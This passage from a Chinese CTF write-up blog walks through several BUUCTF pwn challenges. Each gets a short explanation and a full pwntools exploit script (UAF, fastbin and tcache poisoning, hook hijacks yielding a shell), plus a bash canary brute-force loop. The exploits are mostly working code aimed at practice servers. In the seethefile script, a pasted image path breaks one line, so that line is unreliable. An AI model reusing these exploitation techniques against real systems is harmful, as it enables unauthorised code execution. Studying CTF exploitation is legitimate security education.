class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x2c0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x3d0</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x208</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>)<span class="comment">#index 6</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;spk_chunk&quot;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">merge(<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1094</span>,<span class="number">0x10A0</span>,<span class="number">0x10AC</span>,<span class="number">0x10B8</span>,<span class="number">0x1018</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">payload=<span class="string">b&quot;u&quot;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(free_hook)</span><br><span class="line">add(<span class="number">0x300</span>,payload)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211231526971.png"></p>
<h2 id="jarvisoj-itemboard"><a href="#jarvisoj-itemboard" class="headerlink" title="jarvisoj_itemboard"></a>jarvisoj_itemboard</h2><p>本题是控制堆块里存放了delete的函数指针，并且存在UAF漏洞，存在show函数常规泄露libc地址即可。将两个控制堆块都放入fast bin里，然后申请与控制堆块等大的堆块，就可以去控制其中的一个控制堆块，将里面的函数指针改为system地址，此时情况为:</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211231756781.png" alt="image-20221123175606412"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28353&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name=<span class="string">&quot;/bin/sh\x00&quot;</span>,content=<span class="string">&quot;/bin/sh\x00&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Item name?\n&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Description&#x27;s len?\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Description?&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which item?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which item?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xFBA</span>,<span class="number">0xFC6</span>,<span class="number">0xFD2</span>,<span class="number">0xFDE</span>,<span class="number">0xB4F</span>,<span class="number">0xCCB</span>)</span><br><span class="line">payload=<span class="string">b&quot;/bin/sh;aaaaaaaa&quot;</span>+p64(sys_addr)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;uuuu&#x27;</span>,payload)</span><br><span class="line">log_addr(<span class="string">&quot;sys_addr&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-c-3"><a href="#ciscn-2019-c-3" class="headerlink" title="ciscn_2019_c_3"></a>ciscn_2019_c_3</h2><p>本题存在两个漏洞，一个是UAF，一个是堆溢出(可以溢出0x10个字节，但代价是无法控制fd和bk指针)</p>
<p>由于是2.27的libc，所以就double free,释放同一个堆块8次，让其进入unsorted bin，泄露libc地址。</p>
<p>接下来有俩思路，第一是利用堆溢出篡改size然后打堆块重叠+tcache poisoning劫持free_hook；第二是利用程序里一个backdoor函数，这个函数可以让某个堆块的fd指针加上一个小的值，先打double free让fd指针是一个堆块的地址，然后不断触发backdoor将fd指向free_hook的位置再将其申请出来劫持，最后写入一个one_gadget的地址即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26543&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&quot;/bin/sh\x00&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: \n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Give me the name: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;weapon:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;attack_times: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">15</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log_info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(free_hook-<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;weapon:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12D1</span>,<span class="number">0x12DD</span>,<span class="number">0x12E9</span>,<span class="number">0x130B</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(search_og(<span class="number">1</span>)+libc_base))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252054342.png" alt="image-20221125205436933"></p>
<h2 id="nsctf-online-2019-pwn2"><a href="#nsctf-online-2019-pwn2" class="headerlink" title="nsctf_online_2019_pwn2"></a>nsctf_online_2019_pwn2</h2><p>本题的漏洞在于这个函数如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252222277.png" alt="image-20221125222254210" style="zoom:50%;" />

<p>该函数可以溢出到bss段0x202090的这个地方，从而篡改一字节，就相当于可以任意堆地址写，任意堆地址读，任意堆地址释放(前提是地址范围都是在可控的最后一字节)。接着就去打堆块重叠泄露libc地址，然后打fastbin attack即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26263&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_size</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please input your name&quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_content</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the note\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your name&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#Tampering chunk</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">input_content(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>))</span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x40&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\xb0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">input_content(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">input_content(<span class="string">b&quot;a&quot;</span>*<span class="number">0xb</span>+p64(search_og(<span class="number">1</span>)+libc_base)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xCFF</span>,<span class="number">0xD0B</span>,<span class="number">0xD17</span>,<span class="number">0xD23</span>,<span class="number">0xD2F</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252226217.png" alt="image-20221125222657876"></p>
<h2 id="metasequoia-2020-samsara"><a href="#metasequoia-2020-samsara" class="headerlink" title="metasequoia_2020_samsara"></a>metasequoia_2020_samsara</h2><p>本题的漏洞是存在UAF和后门函数，只需要让栈里的一个变量为0xdeadbeef即可，而程序自己泄露了栈地址，并且可以在需要篡改的变量的低地址处写入一个64位无符号数。所以打一个house of spirit即可触发后门。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29238&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_1</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Ingredient:\n&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which kingdom?\n&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    </span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line">move(<span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">input_1(<span class="number">0</span>,stack_addr-<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xB99</span>,<span class="number">0xC02</span>,<span class="number">0xC57</span>,<span class="number">0xCCF</span>,<span class="number">0xCE9</span>,<span class="number">0xC9A</span>)</span><br><span class="line">input_1(<span class="number">3</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261111067.png" alt="image-20221126111155652"></p>
<h2 id="huxiangbei-2019-hacknote"><a href="#huxiangbei-2019-hacknote" class="headerlink" title="huxiangbei_2019_hacknote"></a>huxiangbei_2019_hacknote</h2><p>本题是静态链接的题目(任何保护都没有)，在edit函数里存在一个off by one的漏洞(第一次输入一个超过size的字符串，第二次再edit一次，就可以触发off by one)，打一个堆块重叠加fastbin attack。因为是静态链接，所以malloc_hook是在data段上，又没开PIE，所以fastbin attack就可以直接劫持fd的位置为malloc_hook。为了绕过检查，改成malloc_hook-0x16如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261551786.png" alt="image-20221126155133663" style="zoom:50%;" />

<p>最终将malloc_hook里写入malloc_hook+8后面紧跟shellcode即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=load(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26161&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Note:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Index of Note:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Index of Note:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the Note:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x29</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;iiii&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;prevent merge&#x27;</span>)</span><br><span class="line"><span class="comment">#0x6CB788</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x19</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+<span class="string">b&#x27;\xa1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x41</span>)+p64(<span class="number">0x6CB788</span>-<span class="number">0x16</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">debug(p,<span class="number">0x400EB9</span>,<span class="number">0x400ECA</span>,<span class="number">0x400EA8</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">6</span>+p64(<span class="number">0x6CB788</span>+<span class="number">8</span>)+shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;-----------------\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input the Size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261554595.png" alt="image-20221126155434205"></p>
<h2 id="picoctf-2018-buffer-overflow-3"><a href="#picoctf-2018-buffer-overflow-3" class="headerlink" title="picoctf_2018_buffer overflow 3"></a>picoctf_2018_buffer overflow 3</h2><p>本题以 <code>ssh</code> 登录，无法直接去打远程，而是登录远程服务器，来打的本地，需要注意的是本地也没有 <code>pwntools</code> ，所以无法用 <code>py</code> 脚本来打。</p>
<p>本题就是自己实现了一个四字节的 <code>canary</code> (从 <code>canary.txt</code> 文件中读取的),然后有个明显的栈溢出，并且给了后门函数读取 <code>flag</code></p>
<p>关键点如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041630782.png" alt="image-20230204163000453" style="zoom:50%;" />

<p>第 <code>21</code> 行，可以往 <code>buf</code> 直接溢出，控制 <code>s1</code> ，但需要注意的是 <code>s1</code> 本来的数据存放的就是 <code>canary</code> ，这就意味着我们可以先输入一个字符，因为后面三个字符一定是正确的（不覆盖的话），如果这个字符正确，就可以通过检查，从而实现 <code>canary</code>  一个一个字符的比对。</p>
<p>因此这里的我们 <code>ssh</code> 登录上后，用这个 <code>shell</code> 命令 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in &#123;0..255&#125;; do python -c &quot;print \&quot;33\\n\&quot; + \&quot;U\&quot;*32 + chr($i)&quot; | ./vuln &gt;/dev/null &amp;&amp; echo &quot;$i&quot;; done</span><br></pre></td></tr></table></figure>

<p>来将 <code>canary</code> 的第一个字符来爆破出来，一次类推进行逐位爆破，具体而言，循环语句 <code>for i in &#123;0..255&#125;</code> 将 <code>$i$</code> 从 <code>0</code> 到 <code>255</code> 依次设置为变量。对于每一次迭代，该命令都使用 <code>python</code> 解释器执行以下脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perlCopy code</span><br><span class="line">print &quot;33\n&quot; + &quot;U&quot;*32 + chr($i)</span><br></pre></td></tr></table></figure>

<p>该脚本打印了字符串 “33\n”，然后使用重复字符 “U” 的字符串（长度为 32）连接上 ASCII 码为 $i 的字符，最后通过管道符（|）将输出重定向到可执行文件 <code>./vuln</code>。输出的内容被重定向到 <code>/dev/null</code>，以避免在屏幕上显示。</p>
<p>如果执行 <code>./vuln</code> 程序的退出代码为零，则表明程序正常退出，并使用命令 <code>echo &quot;$i&quot;</code> 将当前 $i 的值打印到屏幕上。</p>
<p>依次类推将每一位的 <code>canary</code> 都爆破出来 ，因为题目给了后门函数，因此最后返回地址填充成后门函数的地址即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302050918794.png" alt="image-20230205091810320"></p>
<h2 id="pwnable-seethefile"><a href="#pwnable-seethefile" class="headerlink" title="pwnable_seethefile"></a>pwnable_seethefile</h2><p>这题我是真的烦，这题的 <code>_IO_file_close</code> 和 <code>_IO_new_file_finish</code> 都可以劫持，因为我调试的时候是先看触发了 <code>_IO_file_close</code> ,所以就想着来打这个。按理说只要检查绕过了能触发，劫持<code>vtable</code> 之后打哪个都一样，但是我打 <code>_IO_file_close</code> 远程死活不通（本地是能通的）  然后网上一搜 <code>wp</code> 发现全打的是 <code>_IO_new_file_finish</code> , 我也不知道为啥都会想着去打这个位于后面的函数指针…</p>
<p>有个除了 <code>flag</code> 文件的任意文件读取，所以直接去读 <code>/proc/self/maps</code> 文件获取 <code>libc</code> 地址，然后有个很明显的篡改文件指针的漏洞，就伪造一个 <code>IO_FILE</code> 然后控制 <code>vtable</code> ，总之这题除了那个获取 <code>libc</code> 地址的操作我是第一次见之外，后面攻击 <code>IO</code> 流都是入门操作… 不说了 越想越气</p>
<p>这里的 <code>exp</code> 注释的部分是我最初打 <code>_IO_new_file_finish</code> 的 <code>payload</code> 。本题能打通，远程不行…  <strong>注意：获取的 <code>libc</code> 地址 <code>+0x1000</code> 才是 <code>libc</code> 基地址</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>,<span class="string">&quot;node4.buuoj.cn:25199&quot;</span>,<span class="string">&quot;/home/zikh/Desktop/buu32-libc-2.23.so&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x08048AE0</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;What do you want to see :&quot;</span>,<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineaft![image-<span class="number">20230208221017928</span>](C:/Users/<span class="number">86137</span>/AppData/Roaming/Typora/typora-user-images/image-<span class="number">20230208221017928.</span>png)er(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">heap_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x1000</span></span><br><span class="line">log_addr(<span 